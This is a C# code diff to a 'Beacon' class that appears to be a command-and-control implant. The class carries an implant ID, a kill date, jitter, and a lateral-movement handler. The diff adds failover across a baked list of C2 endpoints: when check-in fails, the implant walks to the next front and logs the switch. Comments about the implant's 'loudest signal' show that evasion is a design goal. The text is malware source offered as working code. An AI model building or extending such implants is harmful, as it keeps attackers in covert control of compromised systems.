@@ -35,7 +35,7 @@ internal sealed class Beacon
     // persistent connection would be the loudest signal an implant emits.
     // Both ride the same stream contract; only the client's use of it differs.
     private readonly string _mode;
-    private readonly string _beaconUrl;
+    private readonly EgressEndpoints _egress;
     private readonly string _implantId;
     private readonly X509Certificate2 _leaf;
     private readonly RSA _privateKey;
@@ -61,10 +61,10 @@ internal sealed class Beacon
     /// Builds a Beacon whose handler registry carries no enroll bundle, so the
     /// lateral.move handler reports derivation as unavailable.
     /// </summary>
-    public Beacon(string beaconUrl, string implantId, X509Certificate2 leaf, RSA privateKey,
+    public Beacon(EgressEndpoints egress, string implantId, X509Certificate2 leaf, RSA privateKey,
         IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
         IReadOnlyList<string> classVerbs, TextWriter log)
-        : this(beaconUrl, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll: null, classVerbs, log)
+        : this(egress, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll: null, classVerbs, log)
     {
     }
 
@@ -73,10 +73,10 @@ internal sealed class Beacon
     /// baked profile or the -mode flag decides). See the field comment for what
     /// each mode trades.
     /// </summary>
-    public Beacon(string mode, string beaconUrl, string implantId, X509Certificate2 leaf, RSA privateKey,
+    public Beacon(string mode, EgressEndpoints egress, string implantId, X509Certificate2 leaf, RSA privateKey,
         IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
         EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log)
-        : this(beaconUrl, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll, classVerbs, log)
+        : this(egress, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll, classVerbs, log)
     {
         _mode = mode;
     }
@@ -86,13 +86,15 @@ internal sealed class Beacon
     /// <paramref name="enroll"/> (architecture.md Sec 10.1). A null bundle leaves
     /// derivation disabled. <paramref name="classVerbs"/> is the baked verb set;
     /// the advertised capability set derives from it (Sec 5.3).
+    /// <paramref name="egress"/> is the baked endpoint walk (Sec 8): the cycle
+    /// dials the current entry and a failed cycle advances to the next.
     /// </summary>
-    public Beacon(string beaconUrl, string implantId, X509Certificate2 leaf, RSA privateKey,
+    public Beacon(EgressEndpoints egress, string implantId, X509Certificate2 leaf, RSA privateKey,
         IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
         EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log)
     {
         _mode = BeaconModes.Stream;
-        _beaconUrl = beaconUrl;
+        _egress = egress;
         _implantId = implantId;
         _leaf = leaf;
         _privateKey = privateKey;
@@ -158,7 +160,23 @@ internal sealed class Beacon
             if (cycle == BeaconCycleResult.Terminal)
                 return;
 
-            consecutiveFailures = cycle == BeaconCycleResult.Handshaken ? 0 : consecutiveFailures + 1;
+            if (cycle == BeaconCycleResult.Handshaken)
+            {
+                consecutiveFailures = 0;
+            }
+            else
+            {
+                consecutiveFailures++;
+                // The egress walk (architecture.md Sec 8): a cycle that never
+                // reached a handshake means the current front is not answering,
+                // so the next attempt dials the next entry. The walk wraps to the
+                // primary, keeping the whole list in rotation; a cycle that
+                // handshook keeps the entry that answered.
+                var from = _egress.CurrentBeaconUrl;
+                _egress.Advance();
+                if (from != _egress.CurrentBeaconUrl)
+                    _log.WriteLine($"beacon endpoint {from} failed; walking to {_egress.CurrentBeaconUrl}");
+            }
             try
             {
                 await SleepWithJitterAsync(consecutiveFailures, cancellationToken);
@@ -205,7 +223,7 @@ internal sealed class Beacon
         // from the SocketsHttpHandler's SslOptions. The beacon URL may be passed
         // as "host:port" (no scheme); prepend https:// so the channel builder
         // accepts it.
-        var address = GrpcAddress(_beaconUrl);
+        var address = GrpcAddress(_egress.CurrentBeaconUrl);
         using var channel = GrpcChannel.ForAddress(address, new GrpcChannelOptions
         {
             HttpHandler = handler,
